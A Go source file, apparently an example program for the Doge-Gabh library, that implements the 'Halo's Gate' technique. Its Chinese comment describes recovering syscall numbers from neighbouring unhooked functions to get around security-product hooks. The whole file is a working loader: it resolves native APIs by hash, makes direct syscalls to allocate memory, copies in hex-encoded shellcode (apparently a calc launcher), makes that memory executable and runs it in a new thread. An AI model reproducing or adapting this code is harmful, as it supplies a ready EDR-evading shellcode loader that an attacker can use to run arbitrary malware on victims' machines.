package main

import (
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"syscall"
	"unsafe"
)

/**

光环之门，hash调用，sysid

地狱之门的一个补丁，并不是所有函数都被hook住。利用旁边未被hook的函数算出sysid然后重建id进行脱钩
https://blog.sektor7.net/#!res/2021/halosgate.md
*/
func main() {

	sc, _ := hex.DecodeString("31c0506863616c635459504092741551648b722f8b760c8b760cad8b308b7e18b250eb1ab2604829d465488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd7")
	var thisThread = uintptr(0xffffffffffffffff)
	//从内存加载，得到sysid
	alloc, e := gabh.MemHgate(str2sha1("NtAllocateVirtualMemory"), str2sha1)
	if e != nil {
		panic(e)
	}
	//从磁盘加载
	protect, e := gabh.DiskHgate(Sha256Hex("NtProtectVirtualMemory"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	createthread, e := gabh.MemHgate(Sha256Hex("NtCreateThreadEx"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	pWaitForSingleObject, _, e := gabh.GetFuncPtr("kernel32.dll", str2sha1("WaitForSingleObject"), str2sha1)
	if e != nil {
		panic(e)
	}
	createThread(sc, thisThread, alloc, protect, createthread, pWaitForSingleObject)
}

func createThread(sc []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {

	const (
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(sc))
	r1, r := gabh.HgSyscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	//copy shellcode
	memcpy(baseA, sc)

	var oldprotect uintptr
	r1, r = gabh.HgSyscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hhosthread uintptr
	r1, r = gabh.HgSyscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.Syscall(uintptr(pWaitForSingleObject), 2, handle, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
